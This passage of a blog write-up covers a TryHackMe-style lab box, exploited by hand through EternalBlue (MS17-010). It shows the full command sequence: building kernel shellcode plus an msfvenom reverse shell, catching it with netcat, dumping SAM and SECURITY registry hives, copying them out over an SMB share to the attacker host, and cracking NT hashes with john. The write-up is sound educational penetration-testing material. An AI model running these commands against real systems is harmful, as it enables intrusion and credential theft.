+|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+
+Nmap done: 1 IP address (1 host up) scanned in 15.51 seconds
+</code></pre><p>Once agaiin, the scans lead to the same conclusion that the host is vulnerable to eternalblue. So the next step was to hop on google and <a href=https://www.exploit-db.com>exploitdb</a> to start looking for an exploit.</p><h3 id=preparing-the-attack-1>Preparing the attack</h3><p>The first result that turned up was an exploit from Sleepya <a href=https://www.exploit-db.com/exploits/42031>Microsoft Windows 7/2008 R2 - &lsquo;EternalBlue&rsquo; SMB Remote Code Execution (MS17-010) </a>, whereas google pointed me to <a href=https://github.com/worawit/MS17-010/>worawit/MS17-010</a>. Upon further inspection, they looked to like the same exploit, but the worawit link provided shellcode that could be used as the basis for a payload.</p><p>Looking deeper into the <a href=https://github.com/worawit/MS17-010/blob/master/shellcode/eternalblue_kshellcode_x64.asm>eternalblue_kshellcode_x64.asm shellcode</a>, it looked like the shellcode expected a user payload to be appended to the end of the binary both of which still needed to be prepared.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm>userland_start:
+userland_start_thread:
+    <span style=color:#75715e>; CreateThread(NULL, 0, &amp;threadstart, NULL, 0, NULL)
+</span><span style=color:#75715e></span>    <span style=color:#a6e22e>xchg</span> <span style=color:#66d9ef>rdx</span>, <span style=color:#66d9ef>rax</span>   <span style=color:#75715e>; rdx is CreateThread address passed from kernel
+</span><span style=color:#75715e></span>    <span style=color:#66d9ef>xor</span> <span style=color:#66d9ef>ecx</span>, <span style=color:#66d9ef>ecx</span>    <span style=color:#75715e>; lpThreadAttributes = NULL
+</span><span style=color:#75715e></span>    <span style=color:#66d9ef>push</span> <span style=color:#66d9ef>rcx</span>        <span style=color:#75715e>; lpThreadId = NULL
+</span><span style=color:#75715e></span>    <span style=color:#66d9ef>push</span> <span style=color:#66d9ef>rcx</span>        <span style=color:#75715e>; dwCreationFlags = 0
+</span><span style=color:#75715e></span>    <span style=color:#66d9ef>mov</span> <span style=color:#66d9ef>r9</span>, <span style=color:#66d9ef>rcx</span>     <span style=color:#75715e>; lpParameter = NULL
+</span><span style=color:#75715e></span>    <span style=color:#66d9ef>lea</span> <span style=color:#66d9ef>r8</span>, [<span style=color:#66d9ef>rel</span> <span style=color:#66d9ef>userland_payload</span>]  <span style=color:#75715e>; lpStartAddr
+</span><span style=color:#75715e></span>    <span style=color:#66d9ef>mov</span> <span style=color:#66d9ef>edx</span>, <span style=color:#66d9ef>ecx</span>    <span style=color:#75715e>; dwStackSize = 0
+</span><span style=color:#75715e></span>    <span style=color:#66d9ef>sub</span> <span style=color:#66d9ef>rsp</span>, <span style=color:#ae81ff>0x20</span>
+    <span style=color:#a6e22e>call</span> <span style=color:#66d9ef>rax</span>
+    <span style=color:#a6e22e>add</span> <span style=color:#66d9ef>rsp</span>, <span style=color:#ae81ff>0x30</span>
+    <span style=color:#a6e22e>ret</span>
+    
+userland_payload:
+</code></pre></div><p>With all this in mind, I then pulled down the python exploit script and shellcode and assembled the latter with nasm as a flat binary. Then I generated an unstaged tcp reverse shell for windows as a payload, also a flat binary, and joined the contents contents into a single <code>sc_joined.bin</code> payload. One pointless thing to note is I added an arbitrary nop sled to the payload. This could have been left out.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~/ctf/scans# cd ../
+root@kali:~/ctf# mkdir exploits <span style=color:#f92672>&amp;&amp;</span> cd exploits
+root@kali:~/ctf/exploits# curl -o 42031.py https://www.exploit-db.com/raw/42031
+root@kali:~/ctf/exploits# curl -sO https://raw.githubusercontent.com/worawit/MS17-010/master/shellcode/eternalblue_kshellcode_x64.asm
+root@kali:~/ctf/exploits# nasm -f bin eternalblue_kshellcode_x64.asm -o sc_x64_kernel.bin
+root@kali:~/ctf/exploits# msfvenom -p windows/x64/shell_reverse_tcp -a x64 --platform windows -f raw -n100 LPORT<span style=color:#f92672>=</span><span style=color:#ae81ff>443</span> LHOST<span style=color:#f92672>=</span>10.10.47.175 &gt; reverse.bin
+No encoder specified, outputting raw payload
+Successfully added NOP sled of size <span style=color:#ae81ff>100</span> from x64/simple
+Payload size: <span style=color:#ae81ff>560</span> bytes
+root@kali:~/ctf/exploits# ls
+42031.py  eternalblue_kshellcode_x64.asm  reverse.bin  sc_joined.bin  sc_x64_kernel.bin
+root@kali:~/ctf/exploits# cat sc_x64_kernel.bin reverse.bin &gt; sc_joined.bin 
+</code></pre></div><h4 id=attacking>Attacking</h4><p>To prepare to catch the reverse shell, I started a netcat listener on port 443 in a new terminal. Then I returned to the original to install the single required python dependency <code>impacket</code> and kick off the attack.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# nc -lvnp <span style=color:#ae81ff>443</span>
+listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>443</span> ...
+</code></pre></div><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~/ctf/exploits# pip2 install impacket
+... 
+root@kali:~/ctf/exploits# python2 42031.py $ATTACKTARGET sc_joined.bin <span style=color:#ae81ff>20</span>
+shellcode size: <span style=color:#ae81ff>1332</span>
+numGroomConn: <span style=color:#ae81ff>20</span>
+Target OS: Windows <span style=color:#ae81ff>7</span> Professional <span style=color:#ae81ff>7601</span> Service Pack <span style=color:#ae81ff>1</span>
+SMB1 session setup allocate nonpaged pool success
+SMB1 session setup allocate nonpaged pool success
+good response status: INVALID_PARAMETER
+<span style=color:#66d9ef>done</span>
+</code></pre></div><p>I switched back to our open netcat process to confirm the success of the attack and was happy to find a Windows shell prompt.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# nc -lvnp <span style=color:#ae81ff>443</span>
+listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>443</span> ...
+connect to <span style=color:#f92672>[</span>10.10.47.175<span style=color:#f92672>]</span> from <span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>10.10.87.38<span style=color:#f92672>]</span> <span style=color:#ae81ff>49170</span>
+Microsoft Windows <span style=color:#f92672>[</span>Version 6.1.7601<span style=color:#f92672>]</span>
+Copyright <span style=color:#f92672>(</span>c<span style=color:#f92672>)</span> <span style=color:#ae81ff>2009</span> Microsoft Corporation.  All rights reserved.
+
+C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\s</span>ystem32&gt;
+</code></pre></div><h3 id=foothold-1>Foothold</h3><p>Unlike the first attack I knew this windows shell was extremely limited, so my first priority was to try to egress credentials so that I could escalate to a more stable point of access.</p><pre><code>C:\Windows\system32&gt;net user
+net user
+
+User accounts for \\
+
+-------------------------------------------------------------------------------
+Administrator            Guest                    Jon                      
+The command completed with one or more errors.
+
+
+C:\Windows\system32&gt;cd ../../
+cd ../../
+
+C:\&gt;reg.exe save hklm\sam C:\sam.save
+reg.exe save hklm\sam C:\sam.save
+The operation completed successfully.
+
+C:\&gt;reg.exe save hklm\security C:\security.save
+reg.exe save hklm\security C:\security.save
+The operation completed successfully.
+
+C:\&gt;reg.exe save hklm\system c:\system.save
+reg.exe save hklm\system C:\system.save
+The operation completed successfully.
+
+C:\&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is E611-0B66
+
+ Directory of C:\
+
+03/17/2019  01:27 PM                24 flag1.txt
+07/13/2009  09:20 PM    &lt;DIR&gt;          PerfLogs
+04/12/2011  02:28 AM    &lt;DIR&gt;          Program Files
+03/17/2019  04:28 PM    &lt;DIR&gt;          Program Files (x86)
+11/10/2020  10:18 PM            24,576 sam.save
+11/10/2020  10:18 PM            24,576 security.save
+11/10/2020  10:19 PM        12,353,536 system.save
+12/12/2018  09:13 PM    &lt;DIR&gt;          Users
+03/17/2019  04:36 PM    &lt;DIR&gt;          Windows
+               4 File(s)     12,402,712 bytes
+               5 Dir(s)  20,753,133,568 bytes free
+
+C:\&gt;type flag1.txt
+type flag1.txt
+flag{access_the_machine}
+C:\&gt;
+</code></pre><p>The first step was identifying the local users and attempting to dump some crucial registers that I could attack offline. While doing this I happened to dump these registry hives to the root of the <code>C:\</code> drive which happened to point out the first flag <code>flag{access_the_machine}</code>. In hindsight this was probably a poor choice of location as it would be much more likely to be caught here than in other locations.</p><p>Now that I had the hives dumped on disk I still needed to figure out how to egress them to my local machine for further attack. This lead me to reference an example from <a href=https://blog.ropnop.com/transferring-files-from-kali-to-windows/#smb>ropnop&rsquo;s blog</a> pointing me towards the impacket-smbserver which comes preinstalled on Kali. I could interact with SMB from the cmd shell with out the need for an interactive shell or any other tools.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~/# mkdir -p ctf/extractor <span style=color:#f92672>&amp;&amp;</span> cd ctf/extractor
+
+root@kali:~/ctf/extractor# impacket-smbserver BLUE $PWD
+Impacket v0.9.21 - Copyright <span style=color:#ae81ff>2020</span> SecureAuth Corporation
+
+<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Config file parsed
+<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Callback added <span style=color:#66d9ef>for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Callback added <span style=color:#66d9ef>for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Config file parsed
+<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Config file parsed
+<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Config file parsed
+
+root@kali:~# netstat -plunt | grep <span style=color:#ae81ff>445</span>
+tcp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> 0.0.0.0:445             0.0.0.0:*               LISTEN      1428/python3
+</code></pre></div><p>From the target host I was now able to validate that I could see and connect to the newly started share and promptly copied the hives back to my attack machine.</p><pre><code>C:\&gt;net view \\10.10.47.175
+net view \\10.10.47.175
+Shared resources at \\10.10.47.175
+
+(null)
+
+Share name  Type  Used as  Comment  
+
+-------------------------------------------------------------------------------
+BLUE        Disk                    
+The command completed successfully.
+
+
+C:\&gt;copy C:\sam.save \\10.10.47.175\BLUE\sam.save
+copy C:\sam.save \\10.10.47.175\BLUE\sam.save
+        1 file(s) copied.
+
+C:\&gt;copy C:\security.save \\10.10.47.175\BLUE\security.save
+copy C:\security.save \\10.10.47.175\BLUE\security.save
+        1 file(s) copied.
+
+C:\&gt;copy C:\system.save \\10.10.47.175\BLUE\system.save
+copy C:\system.save \\10.10.47.175\BLUE\system.save
+        1 file(s) copied.
+</code></pre><p>With these credentials now available locally, I could extract the user hashes using <code>secretsdump</code> from impacket and perform the same attack with <code>john</code> that I had performed before.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~/ctf/extractor# impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
+Impacket v0.9.21 - Copyright <span style=color:#ae81ff>2020</span> SecureAuth Corporation
+
+<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Target system bootKey: 0x55bd17830e678f18a3110daf2c17d4c7
+<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Dumping local SAM hashes <span style=color:#f92672>(</span>uid:rid:lmhash:nthash<span style=color:#f92672>)</span>
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Dumping cached domain logon information <span style=color:#f92672>(</span>domain/username:hash<span style=color:#f92672>)</span>
+<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Dumping LSA Secrets
+<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> DPAPI_SYSTEM 
+dpapi_machinekey:0xdc31ac35e19a18b00b5b066de3e8da898bf8da71
+dpapi_userkey:0xfaea7403f42b58e1a5dd35ee816185a953b1c795
+<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> NL$KM 
+ <span style=color:#ae81ff>0000</span>   <span style=color:#ae81ff>45</span> <span style=color:#ae81ff>94</span> 4A <span style=color:#ae81ff>93</span> A2 9D D2 8E  2B CF 5F DF <span style=color:#ae81ff>66</span> <span style=color:#ae81ff>75</span> <span style=color:#ae81ff>59</span> 4C   E.J.....+._.fuYL
+ <span style=color:#ae81ff>0010</span>   E9 BC B8 <span style=color:#ae81ff>91</span> 2C <span style=color:#ae81ff>66</span> <span style=color:#ae81ff>59</span> 1E  BF <span style=color:#ae81ff>53</span> 1E <span style=color:#ae81ff>77</span> BE C2 9B <span style=color:#ae81ff>74</span>   ....,fY..S.w...t
+ <span style=color:#ae81ff>0020</span>   <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>64</span> <span style=color:#ae81ff>04</span> B4 <span style=color:#ae81ff>56</span> EA 7D 6F  BA C2 1B 7E F0 BA <span style=color:#ae81ff>53</span> <span style=color:#ae81ff>67</span>   sd..V.<span style=color:#f92672>}</span>o...~..Sg
+ <span style=color:#ae81ff>0030</span>   E6 E6 <span style=color:#ae81ff>66</span> <span style=color:#ae81ff>84</span> <span style=color:#ae81ff>95</span> 1F <span style=color:#ae81ff>90</span> <span style=color:#ae81ff>60</span>  <span style=color:#ae81ff>42</span> EE <span style=color:#ae81ff>34</span> 0A EE <span style=color:#ae81ff>99</span> 9F <span style=color:#ae81ff>55</span>   ..f....<span style=color:#e6db74>`</span>B.4....U
+NL$KM:45944a93a29dd28e2bcf5fdf6675594ce9bcb8912c66591ebf531e77bec29b74736404b456ea7d6fbac21b7ef0ba5367e6e66684951f906042ee340aee999f55
+<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Cleaning up...
+
+root@kali:~/ctf/extractor# impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL | egrep <span style=color:#e6db74>&#39;Administrator|Guest|Jon&#39;</span> &gt; hash.txt
+root@kali:~/ctf/extractor# john -format<span style=color:#f92672>=</span>NT --wordlist<span style=color:#f92672>=</span>/usr/share/wordlists/rockyou.txt hash.txt 
+Using default input encoding: UTF-8
+Loaded <span style=color:#ae81ff>2</span> password hashes with no different salts <span style=color:#f92672>(</span>NT <span style=color:#f92672>[</span>MD4 256/256 AVX2 8x3<span style=color:#f92672>])</span>
+Warning: no OpenMP support <span style=color:#66d9ef>for</span> this hash type, consider --fork<span style=color:#f92672>=</span><span style=color:#ae81ff>2</span>
+Press <span style=color:#e6db74>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style=color:#66d9ef>for</span> status
+                 <span style=color:#f92672>(</span>Administrator<span style=color:#f92672>)</span>
+alqfna22         <span style=color:#f92672>(</span>Jon<span style=color:#f92672>)</span>
+2g 0:00:00:00 DONE <span style=color:#f92672>(</span>2020-11-11 13:43<span style=color:#f92672>)</span> 2.985g/s 15224Kp/s 15224Kc/s 15231KC/s alr19882006..alpusidi
+Warning: passwords printed above might not be all those cracked
+Use the <span style=color:#e6db74>&#34;--show --format=NT&#34;</span> options to display all of the cracked passwords reliably
+Session completed
+</code></pre></div><h3 id=wrapping-up-1>Wrapping Up</h3><p>With the credentials in hand I decided to try my had at a remote desktop session. Which happily gave me access to a desktop.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# rdesktop -u Jon 10.10.87.38
+</code></pre></div><p><img src=/img/blue_boot2root_jon_pc.png alt="Jon&rsquo;s PC"></p><h2 id=summary>Summary</h2><p>This experience really hammered in how many of the tedious tasks metasploit handles silently. It deals with, assiting in sourcing and packing an exploit, capturing the outputs of scans, handling setting up listeners and catching shells. Additionally, the value that meterpreter provides in stabalizing a shell, transfering files and pivoting is easy to take for granted until it is no longer available. Despite having to do many of those tasks manually, it was massively educational to be forced to read and understand exploit I had attempted and then pivot with the resources only available on the target&rsquo;s limited shell.</p></div><h4 class=page-header>Related</h4><div class=item><h4><a href=/post/brainpan-boot2root-writeup/>Brainpan Boot2Root Write-Up</a></h4><h5><a href=https://packetfire.org/author/nate-catelli>Nate Catelli</a></h5><h5>A boot2root writeup of the Brainpan1 host from TryHackMe</h5><h5>December 22, 2020</h5><a href=https://packetfire.org/tags/ctf><kbd class=item-tag>ctf</kbd></a><a href=https://packetfire.org/tags/boot2root><kbd class=item-tag>boot2root</kbd></a><a href=https://packetfire.org/tags/hacking><kbd class=item-tag>hacking</kbd></a><a href=https://packetfire.org/tags/writeup><kbd class=item-tag>writeup</kbd></a><a href=https://packetfire.org/tags/tryhackme><kbd class=item-tag>tryhackme</kbd></a></div><div class=item><h4><a href=/post/internal-boot2root-writeup/>Internal Boot2Root Write-Up</a></h4><h5><a href=https://packetfire.org/author/nate-catelli>Nate Catelli</a></h5><h5>A boot2root writeup of the Internal host from TryHackMe</h5><h5>December 5, 2020</h5><a href=https://packetfire.org/tags/ctf><kbd class=item-tag>ctf</kbd></a><a href=https://packetfire.org/tags/boot2root><kbd class=item-tag>boot2root</kbd></a><a href=https://packetfire.org/tags/hacking><kbd class=item-tag>hacking</kbd></a><a href=https://packetfire.org/tags/writeup><kbd class=item-tag>writeup</kbd></a><a href=https://packetfire.org/tags/tryhackme><kbd class=item-tag>tryhackme</kbd></a></div><div class=item><h4><a href=/post/daily-bugle-boot2-root-writeup/>Daily Bugle Boot2Root Write-Up</a></h4><h5><a href=https://packetfire.org/author/nate-catelli>Nate Catelli</a></h5><h5>A boot2root writeup of the Daily Bugle host from TryHackMe</h5><h5>November 27, 2020</h5><a href=https://packetfire.org/tags/ctf><kbd class=item-tag>ctf</kbd></a><a href=https://packetfire.org/tags/boot2root><kbd class=item-tag>boot2root</kbd></a><a href=https://packetfire.org/tags/hacking><kbd class=item-tag>hacking</kbd></a><a href=https://packetfire.org/tags/writeup><kbd class=item-tag>writeup</kbd></a><a href=https://packetfire.org/tags/tryhackme><kbd class=item-tag>tryhackme</kbd></a></div></main><footer><p class="copyright text-muted">© All rights reserved by <a href=https://packetfire.org/>Packetfire</a></p></footer></body></html>
